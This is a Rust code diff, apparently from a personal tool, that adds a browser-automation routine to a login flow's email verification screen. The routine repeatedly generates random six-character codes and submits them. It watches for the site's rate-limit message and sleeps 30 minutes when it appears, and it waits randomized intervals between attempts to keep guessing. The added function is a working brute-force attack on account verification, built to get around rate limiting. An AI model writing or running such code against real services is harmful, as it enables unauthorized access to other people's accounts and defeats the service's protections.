@@ -59,7 +59,7 @@ async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
     let mut rng = StdRng::try_from_rng(&mut SysRng).unwrap(); // From what I could see rng had to be mut to work?? I could just be stupid
 
     navigate_to_email_code_entry(&driver, config_values, &mut rng).await?;
-
+    bruteforce_code(&driver, &mut rng).await?;
     Ok(())
 }
 
@@ -175,14 +175,61 @@ async fn click_send_verification_code_button(driver: &WebDriver) -> Result<(), B
     Ok(())
 }
 
+async fn bruteforce_code(driver: &WebDriver, rng: &mut StdRng) -> Result<(), Box<dyn Error + Send + Sync>> {
+    let code_ui_screen_css_selector = ".size-md__8a031";
+    driver.query(By::Css(code_ui_screen_css_selector)).first().await?;
+    log::info!("Code UI menu exists");
+
+    let code_ui_menu = driver.find(By::Css(code_ui_screen_css_selector)).await?;
+    log::info!("Found code UI menu");
+
+    let input_box_css_selector = r#"[label="Verification Code"]"#;
+    driver.query(By::Css(input_box_css_selector)).first().await?;
+    log::info!("Code input box exists.");
+
+    let input_box = driver.find(By::Css(input_box_css_selector)).await?;
+    log::info!("Found code input box.");
+
+    let attempt_code_css_selector = ".actionBarTrailing__8a031 > div:nth-child(1) > button:nth-child(1)";
+    driver.query(By::Css(attempt_code_css_selector)).first().await?;
+    log::info!("Submit code button exists.");
+
+    let attempt_code_button = driver.find(By::Css(attempt_code_css_selector)).await?;
+    log::info!("Found attempt code button.");
+
+
+    loop {
+        let code = create_code()?;
+        input_box.send_keys(code.clone()).await?;
+
+        // Detect rate limits and sleep for 30 minutes
+        let code_ui_text = code_ui_menu.text().await?;
+        if code_ui_text.contains("You are being rate limited.") {
+            let time_to_sleep = time::Duration::from_mins(30);
+            thread::sleep(time_to_sleep); // We don't use sleep() because we need minutes not seconds, and I want a consistent value.
+            log::info!("Sleeping for 30 minutes due to rate limits being detected.")
+        } else {
+            attempt_code_button.click().await?;
+            log::info!("Trying code {}", code);
+            
+            input_box.clear().await?;
+
+            log::info!("Cleared input box.");
+            sleep(rng, 40, 120);
+        }
+    }
+
+    Ok(())
+}
+
 fn create_code() -> Result<String, Box<dyn Error + Send + Sync>> {
 
     let mut rng = rand::rng();
     let regex_gen = rand_regex::Regex::compile("[A-Z0-9]{6}", 100)?;
 
-    let random_string: String = rng.sample(&regex_gen);
+    let random_string:String = rng.sample(&regex_gen);
     log::info!("Generated code {}", random_string);
-    
+
     Ok(random_string)
 }
 
